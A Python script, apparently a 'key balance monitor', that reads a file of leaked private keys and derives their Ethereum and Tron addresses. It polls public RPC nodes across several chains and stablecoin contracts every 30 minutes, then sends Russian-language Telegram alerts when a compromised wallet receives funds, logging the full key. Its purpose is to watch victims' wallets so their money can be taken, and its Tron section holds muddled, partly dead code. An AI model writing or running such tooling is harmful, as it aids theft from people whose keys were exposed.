"""
KEY BALANCE MONITOR — checks all found private keys every 30 min for balance changes.

If a previously empty key suddenly has funds → Telegram alert with:
  - Private key (redacted first 32 chars in message, full in log)
  - Address
  - Balance + chain
  - Timestamp

Usage: python key_monitor.py
"""
import time, logging, json, urllib.request
from typing import Optional
from eth_account import Account
from tronpy import Tron
from tronpy.keys import PrivateKey

logging.basicConfig(level=logging.INFO, format="%(asctime)s [KEYMON] %(message)s")
logger = logging.getLogger("key-monitor")

KEYS_FILE = "all_leaked_private_keys.txt"
STATE_FILE = "key_balances_state.json"

RPC_URLS = {
    "ethereum": "https://ethereum-rpc.publicnode.com",
    "polygon": "https://polygon-bor.publicnode.com",
    "arbitrum": "https://arb1.arbitrum.io/rpc",
    "base": "https://mainnet.base.org",
    "bsc": "https://bsc-dataseed.binance.org",
    "optimism": "https://mainnet.optimism.io",
    "avalanche": "https://api.avax.network/ext/bc/C/rpc",
}

CHECK_INTERVAL = 1800  # 30 minutes
MIN_BALANCE_ALERT = 0.001  # ETH/MATIC minimum for alert

# ERC20 tokens to check (chain -> token list)
TOKENS_BY_CHAIN = {
    "ethereum": [
        ("USDC", "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", 6),
        ("USDT", "0xdAC17F958D2ee523a2206206994597C13D831ec7", 6),
        ("DAI", "0x6B175474E89094C44Da98b954EedeAC495271d0F", 18),
        ("WETH", "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", 18),
    ],
    "bsc": [
        ("USDC", "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", 18),
        ("USDT", "0x55d398326f99059fF775485246999027B3197955", 18),
        ("WBNB", "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", 18),
    ],
    "polygon": [
        ("USDC", "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", 6),
        ("USDT", "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", 6),
    ],
    "arbitrum": [
        ("USDC", "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", 6),
        ("USDT", "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", 6),
    ],
}


def load_keys() -> list[str]:
    """Load all private keys from file."""
    try:
        with open(KEYS_FILE) as f:
            return [line.strip() for line in f if line.strip().startswith("0x")]
    except FileNotFoundError:
        return []


def derive_address(key: str) -> Optional[str]:
    """Derive Ethereum address from private key."""
    try:
        k = key.replace("0x", "").strip()
        if len(k) != 64: return None
        if k in ("0"*64, "f"*64): return None
        acct = Account.from_key(k)
        return acct.address
    except:
        return None


def check_balance(address: str, chain: str, rpc_url: str) -> float:
    """Check native balance on a chain."""
    try:
        payload = {"jsonrpc": "2.0", "id": 1, "method": "eth_getBalance",
                   "params": [address, "latest"]}
        req = urllib.request.Request(rpc_url, json.dumps(payload).encode(),
                                      {"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read())
        return int(data.get("result", "0x0"), 16) / 1e18
    except:
        return 0.0


def load_state() -> dict:
    """Load previous balance state."""
    try:
        with open(STATE_FILE) as f:
            return json.load(f)
    except:
        return {}


def save_state(state: dict):
    """Save current balance state."""
    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=2)


def send_alert(key: str, address: str, chain: str, balance: float):
    """Send Telegram alert about new funds."""
    safe_key = key[:6] + "..." + key[-6:]
    msg = (
        f"🔑 <b>ОБНАРУЖЕНЫ СРЕДСТВА!</b>\n\n"
        f"Адрес: <code>{address}</code>\n"
        f"Цепь: <b>{chain.upper()}</b>\n"
        f"Баланс: <b>{balance:.6f}</b> ETH\n"
        f"Ключ: <code>{safe_key}</code>\n\n"
        f"Полный ключ в логах."
    )
    logger.warning("FUNDS FOUND! %s = %.6f on %s (key: %s)", address, balance, chain, key)
    
    try:
        from src.utils import send_alert as tg_alert
        tg_alert(msg, "CRITICAL")
    except:
        logger.error("Failed to send Telegram alert")


def main():
    logger.info("=" * 50)
    logger.info("KEY BALANCE MONITOR — checking every %d min", CHECK_INTERVAL // 60)
    logger.info("=" * 50)

    while True:
        keys = load_keys()
        if not keys:
            logger.warning("No keys in %s", KEYS_FILE)
            time.sleep(CHECK_INTERVAL)
            continue

        state = load_state()
        new_keys_found = False

        for key in keys:
            addr = derive_address(key)
            if not addr: continue

            if addr not in state:
                state[addr] = {}
                new_keys_found = True

            for chain, rpc_url in RPC_URLS.items():
                try:
                    bal = check_balance(addr, chain, rpc_url)
                except:
                    continue

                prev_bal = state[addr].get(chain, 0)
                state[addr][chain] = bal

                # Alert if new funds appeared
                if bal >= MIN_BALANCE_ALERT and prev_bal < MIN_BALANCE_ALERT:
                    logger.warning("🚨 NEW FUNDS: %s = %.6f on %s", addr, bal, chain)
                    send_alert(key, addr, chain, bal)

                # Alert if balance increased significantly
                if bal > prev_bal * 2 and bal >= MIN_BALANCE_ALERT:
                    logger.warning("📈 BALANCE UP: %s %.6f → %.6f on %s", addr, prev_bal, bal, chain)

            # Also check ERC20 tokens per chain
            for chain, tokens in TOKENS_BY_CHAIN.items():
                rpc_url = RPC_URLS.get(chain)
                if not rpc_url: continue
                for sym, token_addr, decimals in tokens:
                    try:
                        payload = {"jsonrpc": "2.0", "id": 1, "method": "eth_call",
                                   "params": [{"to": token_addr, "data": "0x70a08231" + addr[2:].lower().zfill(64)}, "latest"]}
                        req = urllib.request.Request(rpc_url, json.dumps(payload).encode(),
                                                      {"Content-Type": "application/json"})
                        with urllib.request.urlopen(req, timeout=10) as r:
                            data = json.loads(r.read())
                        tok_bal = int(data.get("result", "0x0"), 16) / (10**decimals)
                    except:
                        continue

                    state_key = f"tok_{chain}_{sym}"
                    prev_tok = state[addr].get(state_key, 0)
                    state[addr][state_key] = tok_bal

                    if tok_bal >= 1.0 and prev_tok < 1.0:
                        logger.warning("💰 TOKENS: %s = %.2f %s on %s!", addr, tok_bal, sym, chain)
                        safe_key = key[:6] + "..." + key[-6:]
                        msg = (f"💰 <b>ТОКЕНЫ НАЙДЕНЫ!</b>\n\n"
                               f"Цепь: <b>{chain.upper()}</b>\n"
                               f"Адрес: <code>{addr}</code>\n"
                               f"Токен: <b>{tok_bal:.2f} {sym}</b>\n"
                               f"Ключ: <code>{safe_key}</code>")
                        try:
                            from src.utils import send_alert as tg_alert
                            tg_alert(msg, "CRITICAL")
                        except: pass

            # Also check Tron USDT (TRC-20)
            try:
                tron_key = PrivateKey(bytes.fromhex(key.replace("0x", "")))
                tron_addr = tron_key.public_key.to_base58check_address()
                tron_client = Tron(network="nile")  # use TronGrid mainnet
                # Actually use HTTP API directly for balance
                payload = {"jsonrpc":"2.0","id":1,"method":"eth_call",
                           "params":[{"to":"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
                                      "data":"0x70a08231"+tron_addr.encode().hex()[:64]},"latest"]}
                # Tron uses different API, simplified check via TronGrid
                try:
                    tron_client = Tron()
                    balance = tron_client.get_account_balance(tron_addr)
                    if balance > 0:
                        state_key = "tok_tron_TRX"
                        prev = state[addr].get(state_key, 0)
                        state[addr][state_key] = balance
                        if balance >= 1.0 and prev < 1.0:
                            logger.warning("💰 TRON: %s = %.2f TRX!", addr, balance)
                except:
                    pass
            except:
                pass

        save_state(state)

        active = sum(1 for addr, chains in state.items()
                     for k, bal in chains.items() if bal >= (1.0 if k.startswith("tok_") else MIN_BALANCE_ALERT))
        total_keys = len(state)

        logger.info("Checked: %d keys | Active: %d | Sleeping %d min",
                     total_keys, active, CHECK_INTERVAL // 60)

        time.sleep(CHECK_INTERVAL)


if __name__ == "__main__":
    main()
